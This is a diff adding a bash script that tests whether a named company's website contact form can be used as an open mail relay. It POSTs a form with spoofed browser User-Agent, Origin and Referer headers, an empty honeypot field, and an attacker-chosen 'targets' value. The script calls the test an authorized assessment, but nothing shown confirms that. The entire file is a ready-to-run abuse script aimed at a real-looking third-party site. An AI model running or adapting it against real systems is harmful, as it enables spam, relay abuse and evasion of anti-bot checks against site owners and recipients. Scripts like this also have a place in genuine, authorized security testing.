@@ -1,0 +1,17 @@
+#!/bin/bash
+# Independent verifier: open-relay check against in-scope contact-form API.
+# usage: send2.sh "<targets value>" <outfile-prefix>
+T="$1"; OUT="$2"
+TOK="vrf$(head -c 9 /dev/urandom | base64 | tr -c "a-zA-Z0-9" "" | cut -c1-10)"
+URL="$(cat /work/evidence/vfy2/url.txt)"
+curl -s -o "$OUT.body" -D "$OUT.hdr" -X POST "$URL" \
+  -H "Content-Type: multipart/form-data" \
+  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/128 Safari/537.36" \
+  -H "Origin: https://www.infinitycapital.bh" \
+  -H "Referer: https://www.infinitycapital.bh/contact" \
+  -F "fname=Independent" -F "lname=Verifier" -F "areacode=+973" -F "tel=36000000" \
+  -F "cname=SecCheck" -F "subject=Partnership Inquiries" \
+  -F "msg=Security verification test $TOK please disregard authorized assessment." \
+  -F "check=" -F "targets=$T"
+echo "http: $(head -1 "$OUT.hdr")"
+echo "body: $(cat "$OUT.body")"
